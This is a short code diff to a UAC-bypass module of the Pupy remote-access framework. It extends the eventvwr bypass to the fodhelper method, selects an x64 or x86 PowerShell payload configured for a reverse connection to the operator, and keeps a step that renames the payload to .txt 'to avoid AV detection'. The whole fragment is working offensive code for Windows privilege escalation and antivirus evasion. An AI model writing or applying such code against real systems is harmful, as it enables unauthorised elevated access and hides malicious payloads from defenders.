@@ -117,17 +117,21 @@ class BypassUAC(PupyModule):
             else:
                 self.info("Reverse connection mode: Configuring ps1 client with the same configuration as the (parent) launcher on the target")
                 clientConfToUse = self.client.get_conf()
-            if method == "eventvwr":
-                #Specific case for eventvwr method
+            if method == "eventvwr" or method == "fodhelper":
+                #Specific case for eventvwr method and fodhelper
                 if '64' in  self.client.desc['proc_arch']:
                     local_file = pupygen.generate_ps1(self.log, clientConfToUse, x64=True)
+                    self.info("The process architecture on the target is x64: A x64 dll will be used...")
                 else:
                     local_file = pupygen.generate_ps1(self.log, clientConfToUse, x86=True)
+                    self.info("The process architecture on the target is x86: A x86 dll will be used...")
             else:
                 if '64' in  self.client.desc['os_arch']:
                     local_file = pupygen.generate_ps1(self.log, clientConfToUse, x64=True)
+                    self.info("The architecture of the target (OS) is x64: A x64 dll will be used...")
                 else:
                     local_file = pupygen.generate_ps1(self.log, clientConfToUse, x86=True)
+                    self.info("The architecture of the target (OS) is x86: A x86 dll will be used...")
 
             # change the ps1 to txt file to avoid AV detection
             random_name += '.txt'
